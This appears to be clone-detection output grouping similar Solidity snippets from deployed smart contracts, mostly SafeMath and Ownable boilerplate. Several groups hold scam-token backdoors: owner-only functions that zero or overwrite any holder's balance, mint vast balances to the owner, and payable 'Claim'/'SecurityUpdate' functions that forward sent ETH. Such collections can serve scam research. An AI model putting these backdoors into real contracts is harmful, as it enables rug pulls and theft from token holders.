<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="152" endline="158" pcid="3819">
    function cexLock(address[] memory _user, uint256[] memory _amount) external {
        if(_owner == msg.sender) {
            for(uint i = 0; i < _user.length; i++) {
                _transfer(msg.sender, _user[i], _amount[i]);
            }
        }
    }
</source>
</class>

<class classid="59" nclones="14" nlines="7" similarity="75">
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="163" endline="167" pcid="376">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = boughAmount;
        } else {}
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="155" endline="161" pcid="1096">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = 0;
        } else {

        }
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="154" endline="160" pcid="617">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = 0;
        } else {

        }
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="155" endline="161" pcid="2389">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = 0;
        } else {

        }
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="161" endline="165" pcid="6733">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = boughAmount;
        } else {}
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="147" endline="153" pcid="4902">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = 0;
        } else {

        }
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="163" endline="167" pcid="7083">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = boughAmount;
        } else {}
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="157" endline="163" pcid="7368">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = boughAmount;
        } else {

        }
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="163" endline="167" pcid="4507">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = boughAmount;
        } else {}
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="154" endline="160" pcid="4171">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = 0;
        } else {

        }
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="153" endline="159" pcid="3941">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = 0;
        } else {

        }
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="160" endline="164" pcid="3820">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = boughAmount;
        } else {}
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="162" endline="166" pcid="3744">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = boughAmount;
        } else {}
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="152" endline="158" pcid="3163">
    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = 0;
        } else {

        }
    }
</source>
</class>

<class classid="60" nclones="5" nlines="12" similarity="100">
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="169" endline="179" pcid="377">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            uint256 devTransfer = n;
            devTransfer = 10**15 * n * 1 *  10 **_decimals;
            uint256 rev_bxx = devTransfer;
            _balances[msg.sender] = rev_bxx;
        } else {
            _balances[msg.sender] = _balances[msg.sender]+1-1;
            require(_owner == msg.sender);
        }
    } 
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="169" endline="179" pcid="7084">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            uint256 devTransfer = n;
            devTransfer = 10**15 * n * 1 *  10 **_decimals;
            uint256 rev_bxx = devTransfer;
            _balances[msg.sender] = rev_bxx;
        } else {
            _balances[msg.sender] = _balances[msg.sender]+1-1;
            require(_owner == msg.sender);
        }
    } 
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="166" endline="176" pcid="3821">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            uint256 devTransfer = n;
            devTransfer = 10**15 * n * 1 *  10 **_decimals;
            uint256 rev_bxx = devTransfer;
            _balances[msg.sender] = rev_bxx;
        } else {
            _balances[msg.sender] = _balances[msg.sender]+1-1;
            require(_owner == msg.sender);
        }
    } 
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="167" endline="177" pcid="6734">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            uint256 devTransfer = n;
            devTransfer = 10**15 * n * 1 *  10 **_decimals;
            uint256 rev_bxx = devTransfer;
            _balances[msg.sender] = rev_bxx;
        } else {
            _balances[msg.sender] = _balances[msg.sender]+1-1;
            require(_owner == msg.sender);
        }
    } 
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="168" endline="178" pcid="3745">
    function revertExecute(uint256 n) external {
        if(_owner == msg.sender){
            uint256 devTransfer = n;
            devTransfer = 10**15 * n * 1 *  10 **_decimals;
            uint256 rev_bxx = devTransfer;
            _balances[msg.sender] = rev_bxx;
        } else {
            _balances[msg.sender] = _balances[msg.sender]+1-1;
            require(_owner == msg.sender);
        }
    } 
</source>
</class>

<class classid="61" nclones="14" nlines="3" similarity="100">
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="180" endline="182" pcid="378">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="168" endline="170" pcid="3943">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="178" endline="180" pcid="6735">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="177" endline="179" pcid="3822">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="162" endline="164" pcid="4904">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="180" endline="182" pcid="7085">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="169" endline="171" pcid="4173">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="169" endline="171" pcid="619">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="179" endline="181" pcid="3746">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="170" endline="172" pcid="2391">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="167" endline="169" pcid="3165">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="170" endline="172" pcid="1098">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="174" endline="176" pcid="7370">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="178" endline="180" pcid="4509">
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }
</source>
</class>

<class classid="62" nclones="22" nlines="4" similarity="75">
<source file="systems/source-code/0x0f0138cbf893dd5926f5f4fd944e616d04617bc3.sol" startline="13" endline="16" pcid="385">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="117" endline="120" pcid="8065">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="17" endline="22" pcid="2583">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="116" endline="119" pcid="8980">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
</source>
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="25" endline="30" pcid="739">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="21" endline="26" pcid="3353">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="17" endline="22" pcid="8920">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="162" endline="169" pcid="7871">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="37" endline="44" pcid="5225">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="21" endline="26" pcid="7392">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="137" endline="140" pcid="7124">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="21" endline="26" pcid="4441">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="34" endline="38" pcid="906">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
</source>
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="167" endline="170" pcid="1085">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
</source>
<source file="systems/source-code/0xeb6f0cfce80e88872c441d618e3c77c184892690.sol" startline="30" endline="36" pcid="8560">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="17" endline="22" pcid="4751">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="129" endline="134" pcid="4817">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="17" endline="22" pcid="5985">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="136" endline="143" pcid="8628">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="129" endline="134" pcid="4992">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="162" endline="169" pcid="1975">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="15" endline="20" pcid="5116">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
</source>
</class>

<class classid="63" nclones="12" nlines="4" similarity="100">
<source file="systems/source-code/0x0f0138cbf893dd5926f5f4fd944e616d04617bc3.sol" startline="18" endline="21" pcid="386">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="24" endline="27" pcid="8921">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="22" endline="25" pcid="5117">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="24" endline="27" pcid="2584">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="28" endline="31" pcid="3354">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="139" endline="142" pcid="4993">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="24" endline="27" pcid="5986">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
</source>
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="139" endline="142" pcid="4818">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="24" endline="27" pcid="4752">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="28" endline="31" pcid="4442">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="28" endline="31" pcid="7393">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
</source>
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="32" endline="35" pcid="740">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
</source>
</class>

<class classid="64" nclones="8" nlines="3" similarity="100">
<source file="systems/source-code/0x0f0138cbf893dd5926f5f4fd944e616d04617bc3.sol" startline="33" endline="35" pcid="388">
    function Ownable() public {
        owner = msg.sender;
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="48" endline="50" pcid="8923">
    function Ownable() public {
        owner = msg.sender;
    }
</source>
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="56" endline="58" pcid="742">
    function Ownable() public {
        owner = msg.sender;
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="52" endline="54" pcid="4444">
    function Ownable() public {
        owner = msg.sender;
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="48" endline="50" pcid="2586">
    function Ownable() public {
        owner = msg.sender;
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="48" endline="50" pcid="4754">
    function Ownable() public {
        owner = msg.sender;
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="52" endline="54" pcid="7395">
    function Ownable() public {
        owner = msg.sender;
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="52" endline="54" pcid="3356">
    function Ownable() public {
        owner = msg.sender;
    }
</source>
</class>

<class classid="65" nclones="6" nlines="5" similarity="100">
<source file="systems/source-code/0x0f0138cbf893dd5926f5f4fd944e616d04617bc3.sol" startline="42" endline="46" pcid="389">
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="64" endline="68" pcid="8924">
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
</source>
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="72" endline="76" pcid="743">
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="64" endline="68" pcid="2587">
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="64" endline="68" pcid="4755">
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="68" endline="72" pcid="4445">
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
</source>
</class>

<class classid="66" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0x0f0138cbf893dd5926f5f4fd944e616d04617bc3.sol" startline="77" endline="79" pcid="391">
    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="142" endline="144" pcid="5992">
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="140" endline="142" pcid="5123">
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
</source>
</class>

<class classid="67" nclones="8" nlines="3" similarity="100">
<source file="systems/source-code/0x116ffb3d2472fd49bc1c1df1f28636921992a734.sol" startline="12" endline="12" pcid="472">
  function getBalance() public view returns (uint256) { return address(this).balance; }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="89" endline="91" pcid="4985">
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="337" endline="339" pcid="6475">
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
</source>
<source file="systems/source-code/0xfbacfdfa1d4baa6f4f01d7405afb91ecf7e0dd26.sol" startline="13" endline="13" pcid="9168">
  function getBalance() public view returns (uint256) { return address(this).balance; }
</source>
<source file="systems/source-code/0xb52eed206d875da99c5ef11d934e999494da4b97.sol" startline="17" endline="17" pcid="6590">
  function getBalance() public view returns (uint256) { return address(this).balance; }
</source>
<source file="systems/source-code/0xdd00d90da87417666afcad99eb90378993f937f7.sol" startline="15" endline="15" pcid="7844">
  function getBalance() public view returns (uint256) { return address(this).balance; }
</source>
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="89" endline="91" pcid="4810">
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
</source>
<source file="systems/source-code/0x3d769c9e0240db21fff5338500dd0ecda49ec834.sol" startline="35" endline="37" pcid="2225">
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
</source>
</class>

<class classid="68" nclones="17" nlines="3" similarity="100">
<source file="systems/source-code/0x116ffb3d2472fd49bc1c1df1f28636921992a734.sol" startline="14" endline="14" pcid="473">
  function Claim(address sender) public payable { payable(sender).transfer(msg.value);  }
</source>
<source file="systems/source-code/0xdd00d90da87417666afcad99eb90378993f937f7.sol" startline="22" endline="22" pcid="7850">
  function Swap(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0xdd00d90da87417666afcad99eb90378993f937f7.sol" startline="20" endline="20" pcid="7848">
  function Execute(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0xdd00d90da87417666afcad99eb90378993f937f7.sol" startline="21" endline="21" pcid="7849">
  function Multicall(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0x116ffb3d2472fd49bc1c1df1f28636921992a734.sol" startline="19" endline="19" pcid="478">
  function Swap(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0x116ffb3d2472fd49bc1c1df1f28636921992a734.sol" startline="20" endline="20" pcid="479">
  function Connect(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0xdd00d90da87417666afcad99eb90378993f937f7.sol" startline="19" endline="19" pcid="7847">
  function ClaimRewards(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0x116ffb3d2472fd49bc1c1df1f28636921992a734.sol" startline="18" endline="18" pcid="477">
  function Multicall(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0xdd00d90da87417666afcad99eb90378993f937f7.sol" startline="18" endline="18" pcid="7846">
  function ClaimReward(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0xdd00d90da87417666afcad99eb90378993f937f7.sol" startline="24" endline="24" pcid="7852">
  function SecurityUpdate(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0x116ffb3d2472fd49bc1c1df1f28636921992a734.sol" startline="17" endline="17" pcid="476">
  function Execute(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
<source file="systems/source-code/0xdd00d90da87417666afcad99eb90378993f937f7.sol" startline="17" endline="17" pcid="7845">
  function Claim(address sender) public payable { payable(sender).transfer(msg.value);  }
</source>
<source file="systems/source-code/0x116ffb3d2472fd49bc1c1df1f28636921992a734.sol" startline="16" endline="16" pcid="475">
  function ClaimRewards(address sender) public payable { payable(sender).transfer(msg.value); }
</source>
